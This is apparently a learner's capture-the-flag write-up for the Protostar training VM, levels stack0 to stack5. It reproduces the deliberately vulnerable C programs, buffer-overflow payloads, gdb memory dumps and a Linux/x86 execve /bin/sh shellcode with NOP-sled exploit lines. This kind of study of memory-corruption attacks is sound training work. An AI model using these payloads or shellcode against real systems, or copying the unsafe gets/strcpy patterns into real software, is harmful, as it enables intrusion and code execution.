# Protostart
* [Protostar Website](https://web.archive.org/web/20170318192755/https://exploit-exercises.com/protostar/)
* [Offset Pattern](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)
## stack0

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```
!!! note
    This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.
    This level is at /opt/protostar/bin/stack0

```
user@protostar:/opt/protostar/bin$ python -c 'print("A"*65)' | ./stack0
you have changed the 'modified' variable
```
!!! note
    * buffersize 64 bytes


## stack1

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

>This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory. 
This level is at /opt/protostar/bin/stack1

!!! tip
    * If you are unfamiliar with the hexadecimal being displayed, “man ascii” is your friend.
    * Protostar is little endian

```
user@protostar:/opt/protostar/bin$ ./stack1 $(python -c 'print("A"*64+"\x64\x63\x62\x61")')
you have correctly got the variable to the right value
```
!!! note
    * buffersize 64 bytes
    * we have to turn mix up bytes because of little endian

## stack2

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

>Stack2 looks at environment variables, and how they can be set.
This level is at /opt/protostar/bin/stack2

```
user@protostar:/opt/protostar/bin$ declare -x GREENIE=$(python -c 'print("A"*64+"\x0a\x0d\x0a\x0d")')
./stack2
```

!!! note
    * [setting env](https://phoenixts.com/blog/environment-variables-in-linux/)

## stack3
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

>Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)
Hints
* both gdb and objdump is your friend you determining where the win() function lies in memory.
>This level is at /opt/protostar/bin/stack3

```
user@protostar:/opt/protostar/bin$ objdump -d stack3 | grep win
08048424 <win>: #here is our adress

user@protostar:/opt/protostar/bin$ python -c 'print("A"*64+"\x24\x84\x04\x08")' | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```

## stack4
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

>Stack4 takes a look at overwriting saved EIP and standard buffer overflows.
This level is at /opt/protostar/bin/stack4
Hints
* A variety of introductory papers into buffer overflows may help.
* gdb lets you do “run < input”
* EIP is not directly after the end of buffer, compiler padding can also increase the size.

```
user@protostar:/opt/protostar/bin$ objdump -d stack4 | grep win
080483f4 <win>:

(gdb) i f
Stack level 0, frame at 0xbffffd80:
 eip = 0x804841d in main (stack4/stack4.c:16); saved eip 0xb7eadc76
 source language c.
 Arglist at 0xbffffd78, args: argc=1, argv=0xbffffe24
 Locals at 0xbffffd78, Previous frame's sp is 0xbffffd80
 Saved registers:
  ebp at 0xbffffd78, eip at 0xbffffd7c
(gdb) x/32x $esp
0xbffffd20:     0xbffffd30      0xb7ec6165      0xbffffd38      0xb7eada75
0xbffffd30:     0x41414141      0x42424242      0xbffffd00      0x080482e8
0xbffffd40:     0xb7ff1040      0x080495ec      0xbffffd78      0x08048449
0xbffffd50:     0xb7fd8304      0xb7fd7ff4      0x08048430      0xbffffd78
0xbffffd60:     0xb7ec6365      0xb7ff1040      0x0804843b      0xb7fd7ff4
0xbffffd70:     0x08048430      0x00000000      0xbffffdf8      0xb7eadc76
0xbffffd80:     0x00000001      0xbffffe24      0xbffffe2c      0xb7fe1848
0xbffffd90:     0xbffffde0      0xffffffff      0xb7ffeff4      0x0804824b

user@protostar:/opt/protostar/bin$ python -c 'print("A"*19*4+"\xf4\x83\x04\x08")' | ./stack4
code flow successfully changed
Segmentation fault
```

Notes:
* find out adress of function win
* find out adress of saved **Stack Pointer**
* Offset: 19 Blocks each 4 Bytes
* overwrite **Return Pointer**

## stack5

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
>Stack5 is a standard buffer overflow, this time introducing shellcode.
This level is at /opt/protostar/bin/stack5
Hints:
* At this point in time, it might be easier to use someone elses shellcode
* If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger
* remove the int3s once your shellcode is done.

Shellcode
```asm
    *****************************************************
    *    Linux/x86 execve /bin/sh shellcode 23 bytes    *
    *****************************************************
    *	  	  Author: Hamza Megahed		        *
    *****************************************************
    *             Twitter: @Hamza_Mega                  *
    *****************************************************
    *     blog: hamza-mega[dot]blogspot[dot]com         *
    *****************************************************
    *   E-mail: hamza[dot]megahed[at]gmail[dot]com      *
    *****************************************************

xor    %eax,%eax
push   %eax
push   $0x68732f2f
push   $0x6e69622f
mov    %esp,%ebx
push   %eax
push   %ebx
mov    %esp,%ecx
mov    $0xb,%al
int    $0x80

********************************
#include <stdio.h>
#include <string.h>
 
char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
		  "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

int main(void)
{
fprintf(stdout,"Length: %d\n",strlen(shellcode));
(*(void(*)()) shellcode)();
return 0;
}

Payload:
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```

```
./vuln $(python -c 'print "\x90"*40 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*47 + "\x20\xce\xff\xff"')

./vuln $(python -c 'print "\x90"*40 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*47 + "\x20\xce\xff\xff"')
 
 (gdb) shell python -c 'print "\x90"*40 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*3 +"B"*4*2 + "\x20\xce\xff\xff"' > /home/user/input
(gdb) run

(gdb) shell python -c 'print "\x90"*32 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*3 +"B"*4*4 + "\x90\xf7\xff\xbf"' > /home/user/input
```

Notes:
* [Shellcode Explanation](https://dhavalkapil.com/blogs/Shellcode-Injection/)
* [Shellcode](http://shell-storm.org/shellcode/files/shellcode-827.php)
* \x90 stands for `nops` in hex

## Scratch Notes

```
user@protostar:~$ python -c 'import struct; p = struct.pack(">I", 0x12345678); print("\x42"*4 + p)' | hexdump -C
00000000  42 42 42 42 12 34 56 78  0a                       |BBBB.4Vx.|
00000009
user@protostar:~$ python -c 'import struct; p = struct.pack(">I", 0x12345678); print("\xCC"*4 + p)' | hexdump -C
00000000  cc cc cc cc 12 34 56 78  0a                       |.....4Vx.|
00000009
user@protostar:~$ python -c 'import struct; p = struct.pack("I", 0x12345678); print("\xCC"*4 + p)' | hexdump -C
00000000  cc cc cc cc 78 56 34 12  0a                       |....xV4..|
00000009
user@protostar:~$ python -c 'import struct; p = struct.pack("<I", 0x12345678); print("\xCC"*4 + p)' | hexdump -C
00000000  cc cc cc cc 78 56 34 12  0a                       |....xV4..|
00000009
user@protostar:~$ python -c 'import struct; p = struct.pack("I", 0x12345678); print("\xCC"*4 + p)' | hexdump -C
00000000  cc cc cc cc 78 56 34 12  0a                       |....xV4..|
00000009
```

```
# program gets argument on runtime in gdb
user@protostar:/opt/protostar/bin$ python -c 'print("A"*64+"BB")' > /home/user/input
(gdb) run $(cat /home/user/input)

# objdump basic usage
objdump -d -M intel <binary>
```


```bash
(gdb) shell python -c "import struct; print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + 'A' + 'B'*4*13  + struct.pack('I', 0xbffff770) " > /home/user/input
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/stack5 < /home/user/input

Breakpoint 1, 0x080483d4 in main (argc=1, argv=0xbffff864) at stack5/stack5.c:10
10      in stack5/stack5.c
(gdb) x/32x $esp
0xbffff760:     0xbffff770      0xb7ec6165      0xbffff778      0xb7eada75
0xbffff770:     0xb7fd7ff4      0x0804958c      0xbffff788      0x080482c4
0xbffff780:     0xb7ff1040      0x0804958c      0xbffff7b8      0x08048409
0xbffff790:     0xb7fd8304      0xb7fd7ff4      0x080483f0      0xbffff7b8
0xbffff7a0:     0xb7ec6365      0xb7ff1040      0x080483fb      0xb7fd7ff4
0xbffff7b0:     0x080483f0      0x00000000      0xbffff838      0xb7eadc76
0xbffff7c0:     0x00000001      0xbffff864      0xbffff86c      0xb7fe1848
0xbffff7d0:     0xbffff820      0xffffffff      0xb7ffeff4      0x08048232
(gdb) c
Continuing.

Breakpoint 2, main (argc=0, argv=0xbffff864) at stack5/stack5.c:11
11      in stack5/stack5.c
(gdb) x/32x $esp
0xbffff760:     0xbffff770      0xb7ec6165      0xbffff778      0xb7eada75
0xbffff770:     0x6850c031      0x68732f2f      0x69622f68      0x50e3896e
0xbffff780:     0xb0e18953      0x4180cd0b      0x42424242      0x42424242
0xbffff790:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff7a0:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff7b0:     0x42424242      0x42424242      0x42424242      0xbffff770
0xbffff7c0:     0x00000000      0xbffff864      0xbffff86c      0xb7fe1848
0xbffff7d0:     0xbffff820      0xffffffff      0xb7ffeff4      0x08048232
(gdb) c
Continuing.
Executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 2: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 2: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 2: No symbol "main" in current context.

Program exited normally.
(gdb)
```
## Python Foo

```python
$ python
>>> import struct
>>>
>>> print struct.pack(">I", 0x41424344) # big endian Integer >I
ABCD
>>> print struct.pack("<I", 0x41424344) # little endian Integer <I
DCBA
>>> print hex(struct.unpack(">I", "ABCD")[0]) # "\x41\x42\x43\x44" as big endian number
0x41424344
>>> print hex(struct.unpack("<I", "ABCD")[0]) # interpret as little endian number
0x44434241
```
